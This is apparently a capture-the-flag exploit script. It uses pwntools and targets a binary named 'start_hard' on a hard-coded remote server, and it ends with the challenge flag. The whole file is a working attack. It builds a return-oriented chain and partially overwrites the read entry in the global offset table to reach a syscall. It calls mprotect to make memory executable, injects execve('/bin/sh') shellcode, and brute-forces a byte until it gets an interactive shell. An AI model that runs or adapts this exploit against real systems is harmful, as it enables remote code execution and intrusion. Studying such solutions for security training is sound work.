from pwn import *
from ctypes import *
BINARY = './start_hard'
DEBUG = 0
p=""
def init():
    global p
    if DEBUG:
         p = process(BINARY)
         #context.log_level = 'debug'
    else:
         p = remote('128.199.152.175', 10001)
elf = ELF(BINARY)
def call_func(func, rdi=0, rsi=0, rdx=0):
    ucall = 0x04005A0
    upop = 0x004005BA

    data = ''
    data += p64(upop)
    data += p64(0)
    data += p64(1)
    data += p64(func)
    data += p64(rdx)
    data += p64(rsi)
    data += p64(rdi)
    data += p64(ucall)
    data += 'A' * 56
    return data
#shellcode = asm(shellcraft.amd64.sh())
shellcode =""
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"
shellcode_addr = 0x601700
overwrite_read = 0x60100f
address_of_page = 0x601000
page_size = 0x1000
rwx = 7
def pwn(syscall_addr):
    #gdb.attach(p,'b *0x400550')
    global p
    init()
    read_ow = ''
    read_ow += '\0' * 9 # padding
    read_ow += p8(syscall_addr) # syscall lsb
    payload = ''
    payload += 'A' * 16 # padding
    payload += 'B' * 8  # rbp
    payload += call_func(elf.got['read'], 0, shellcode_addr, 0x40) # read(0, 0x601700, 0x20)
    payload += call_func(elf.got['read'], 0, overwrite_read, 0xa) # read(0, 0x601018, 0xa) # returns 0xa at $rax
    payload += call_func(elf.got['read'], address_of_page, page_size, rwx)  # return to syscall with $rax = 0xa, which means mprotect(0x601000, 0x1000, 0x7);
    payload += p64(shellcode_addr)

    p.send(payload.ljust(0x400,'\x00'))
    #sleep(1)
    p.send(shellcode.ljust(0x40,'\x00'))
    p.sendline(read_ow)
    p.send('ls\n')
    #print p.recvline()
    if p.recvline(): #if succeed, it will recv, else return.
        p.interactive()
    else:
        p.close()
        #print 'ee'    
        return

if __name__ == '__main__':
    #pwn(0x9e)
    
    for i in range(0,256):   #brute the last byte.
       print i
       try:
           pwn(i)
       except:
           pass
    

##ASIS{n0_exec_stack_slapped_ma_f4c3_hehe_____}


 
    

